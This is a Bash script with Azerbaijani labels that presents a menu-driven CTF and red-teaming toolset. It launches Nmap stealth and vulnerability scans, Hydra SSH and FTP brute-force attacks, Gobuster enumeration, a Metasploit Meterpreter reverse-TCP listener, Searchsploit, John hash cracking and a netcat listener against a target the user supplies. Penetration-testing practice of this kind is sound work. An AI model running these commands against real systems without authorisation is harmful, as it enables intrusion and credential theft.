#!/bin/bash

# Rəng Kodları (Tünd Mavi, Bənövşəyi, Narıncı)
BLUE='\033[1;34m'     # Tünd Mavi
PURPLE='\033[1;35m'   # Bənövşəyi
ORANGE='\033[0;33m'   # Tünd Narıncı
CYAN='\033[0;36m'     # İnfo üçün açıq rəng
NC='\033[0m'          # Rəngi sıfırla

# Banner funksiyası
show_banner() {
    clear
    echo -e "${ORANGE}############################################################"
    echo -e "                      SENAN                                 "
    echo -e "############################################################${NC}"
    echo -e "${BLUE}"
    echo " __  __     __     ______     ______     ______     __  __    "
    echo "/\ \_\ \   /\ \   /\  == \   /\  ___\   /\  __ \   /\ \_\ \   "
    echo "\ \  __ \  \ \ \  \ \  _-/   \ \___  \  \ \  __ \  \ \____ \  "
    echo " \ \_\ \_\  \ \_\  \ \_\      \/\_____\  \ \_\ \_\  \/\_____\ "
    echo "  \/_/\/_/   \/_/   \/_/       \/_____/   \/_/\/_/   \/_____/ "
    echo -e "${NC}"
}

while true; do
    show_banner
    echo -e "${PURPLE}--- Advanced CTF & Red Teaming Toolset ---${NC}\n"
    
    # Menyu seçimləri və İnfo hissələri
    echo -e "${ORANGE}1)${NC} ${BLUE}Nmap Stealth Scan (-sS)${NC}"
    echo -e "   ${CYAN}İnfo: Yarım-açıq skan. Hədəf sistemdə log buraxma ehtimalı daha azdır.${NC}"
    
    echo -e "${ORANGE}2)${NC} ${BLUE}Nmap Aggressive & Script Scan (-A)${NC}"
    echo -e "   ${CYAN}İnfo: OS təyini, servis versiyaları və NSE skriptləri ilə dərin analiz edir.${NC}"
    
    echo -e "${ORANGE}3)${NC} ${BLUE}Hydra SSH Brute Force${NC}"
    echo -e "   ${CYAN}İnfo: SSH portuna qarşı sürətli lüğət hücumu (Brute Force) həyata keçirir.${NC}"
    
    echo -e "${ORANGE}4)${NC} ${BLUE}Gobuster Directory Enumeration${NC}"
    echo -e "   ${CYAN}İnfo: Veb saytlarda gizli qovluq və faylları (admin, backup və s.) tapır.${NC}"
    
    echo -e "${ORANGE}5)${NC} ${BLUE}Hydra FTP Brute Force${NC}"
    echo -e "   ${CYAN}İnfo: FTP protokolu üzərindən giriş məlumatlarını ələ keçirməyə çalışır.${NC}"
    
    echo -e "${ORANGE}6)${NC} ${BLUE}Nmap Vulnerability Scan${NC}"
    echo -e "   ${CYAN}İnfo: Hədəfdə məlum olan CVE boşluqlarını NSE skriptləri ilə axtarır.${NC}"
    
    echo -e "${ORANGE}7)${NC} ${BLUE}Metasploit Listener (Reverse TCP)${NC}"
    echo -e "   ${CYAN}İnfo: Hədəf maşından gələn bağlantıları qəbul etmək üçün payload dinləyicisi.${NC}"
    
    echo -e "${ORANGE}8)${NC} ${BLUE}Searchsploit (Exploit Search)${NC}"
    echo -e "   ${CYAN}İnfo: Offline exploit verilənlər bazasında xidmətə uyğun exploit axtarır.${NC}"
    
    echo -e "${ORANGE}9)${NC} ${BLUE}Hashcat / John Cracking${NC}"
    echo -e "   ${CYAN}İnfo: Red Team əməliyyatlarında ələ keçirilən parolları qırmaq üçündür.${NC}"
    
    echo -e "${ORANGE}10)${NC} ${BLUE}Netcat Port Listener${NC}"
    echo -e "    ${CYAN}İnfo: Red Team üçün sadə və effektiv bağlantı dinləmə aləti.${NC}"
    
    echo -e "\n${PURPLE}11) ÇIXIŞ${NC}"
    
    echo -ne "\n${ORANGE}Seçiminizi edin (1-11): ${NC}"
    read choice

    # Çıxış yoxlaması
    if [[ $choice -eq 11 ]]; then
        echo -e "${PURPLE}Uğurlar, Senan! Tool bağlanır...${NC}"
        exit 0
    fi

    # Hədəf girişi
    echo -ne "${ORANGE}Hədəf (IP/Domain) daxil edin: ${NC}"
    read target

    echo -e "${BLUE}Nəticə işlənir...${NC}\n"

    case $choice in
        1) nmap -sS $target ;;
        2) nmap -A $target ;;
        3) 
            echo -n "Username file: " ; read userlist
            echo -n "Password file: " ; read passlist
            hydra -L $userlist -P $passlist ssh://$target
            ;;
        4) 
            echo -n "Wordlist yolu: " ; read wordlist
            gobuster dir -u $target -w $wordlist
            ;;
        5)
            echo -n "Username file: " ; read userlist
            echo -n "Password file: " ; read passlist
            hydra -L $userlist -P $passlist ftp://$target
            ;;
        6) nmap --script vuln $target ;;
        7) 
            echo -n "LHOST: " ; read lhost
            echo -n "LPORT: " ; read lport
            msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
            ;;
        8) 
            echo -n "Axtarılacaq xidmət: " ; read service
            searchsploit $service
            ;;
        9) 
            echo -n "Hash faylı: " ; read hashfile
            john $hashfile
            ;;
        10) 
            echo -n "Dinlənəcək port: " ; read port
            nc -lvnp $port
            ;;
        *) echo -e "${ORANGE}Yanlış seçim! Yenidən cəhd edin.${NC}" ;;
    esac

    echo -e "\n${PURPLE}Əməliyyat bitdi. Menyuya qayıtmaq üçün Enter-ə basın...${NC}"
    read
done
